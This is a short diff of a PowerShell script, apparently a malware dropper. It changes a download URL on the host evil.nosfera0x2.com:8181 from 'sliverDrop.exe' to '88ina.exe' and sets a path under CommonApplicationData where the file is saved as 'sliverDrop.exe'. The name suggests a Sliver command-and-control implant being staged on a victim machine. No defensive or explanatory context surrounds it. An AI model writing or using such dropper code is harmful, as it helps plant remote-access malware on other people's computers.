@@ -1,5 +1,5 @@
 # Define the URL and target path
-$url = "http://evil.nosfera0x2.com:8181/sliverDrop.exe"
+$url = "http://evil.nosfera0x2.com:8181/88ina.exe"
 $targetDirectory = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('CommonApplicationData'), 'DownloadedFiles')
 $targetFile = [System.IO.Path]::Combine($targetDirectory, 'sliverDrop.exe')
 
